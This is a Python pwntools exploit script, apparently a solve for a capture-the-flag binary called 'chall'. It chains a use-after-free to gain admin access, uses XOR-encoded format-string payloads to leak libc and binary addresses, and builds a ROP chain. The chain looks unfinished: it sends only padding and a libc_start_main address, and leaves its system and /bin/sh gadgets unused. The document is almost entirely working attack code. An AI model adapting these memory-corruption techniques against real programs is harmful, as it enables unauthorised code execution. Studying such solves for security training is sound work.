from pwn import * 

context.arch="x86_64"

def login(p, username, username_length):

    p.sendlineafter("option: ", "1")
    p.sendlineafter("length: ", str(username_length))
    p.sendlineafter("username: ", username)

def logout(p):

    p.sendlineafter("option: ", "2")

def get_secret_menu(p):

    p.sendlineafter("option: ", "3")


def xor_payload(payload):

    arr = [] 

    for char in payload:

        arr.append(chr(char ^ 0xf))

    return "".join(arr)

    
def main():

    GDBSCRIPT = ''' \

        x/40gx $rbp
    '''

    NOTE_SIZE = 100
    HOST = ""
    PORT = 0

    local = True 
    elf = ELF("./chall")
    libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")

    if local:

        p = process("./chall")

    else:

        p = remote(HOST, PORT)

    #======== STEP 1 ===========
    #getting admin access by abusing UAF bug 

    login(p, "A" * 8 + "IS_ADMIN", 16)
    logout(p)
    login(p, "A" * 8, 8)
    get_secret_menu(p)
    
    #======== STEP 2 ============
    #leaking some usefull addresses
    #leaking libc

    payload = b"%1$p|%2$p|%3$p|%4$p|"
    xored_payload = xor_payload(payload)
    p.sendlineafter("Note: ", xored_payload)
    leak = p.recvuntil(b"|", drop=True)

    leak = int(leak, 16)
    log.info(f"leak :{hex(leak)}")

    libc_base = leak - 0x3ed8d0
    libc.address = libc_base 
    log.info(f"libc base : {hex(libc_base)}")
    p.sendlineafter("Description: ", "AAA")

    #leaking binary address

    get_secret_menu(p)

    payload = b"%25$p|%26$p"
    xored_payload = xor_payload(payload)

    p.sendlineafter("Note: ", xored_payload)

    binary_leak = p.recvuntil(b"|", drop=True)
    binary_leak = int(binary_leak, 16)
    log.info(f"binary leak: {hex(binary_leak)}")

    binary_base = binary_leak - 0x2ec
    log.info(f"binary base: {hex(binary_base)}")

    elf.address = binary_base
    p.sendlineafter("Description: ", "AAAA")
    #========= STEP 3 ========
    #building ropchain
    offset = 40

    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address

    bin_sh = next(libc.search(b'/bin/sh'))
    system_addr = libc.symbols['system']
    add_note = binary_base + 0x5ea
    libc_start_main = libc_base + 0x21ab0

    log.info(f"Libc start main: {hex(libc_start_main)}")
    log.info(f"Ret gadget : {hex(ret)}")
    ropchain = flat(

        b"A" * (offset),
        p64(libc_start_main)
    )



    get_secret_menu(p)
    p.sendlineafter("Note: ", "AAA")
    p.sendlineafter("Description: ", ropchain)

    data = p.recv()
    print(data)

if __name__ == "__main__":

    main()
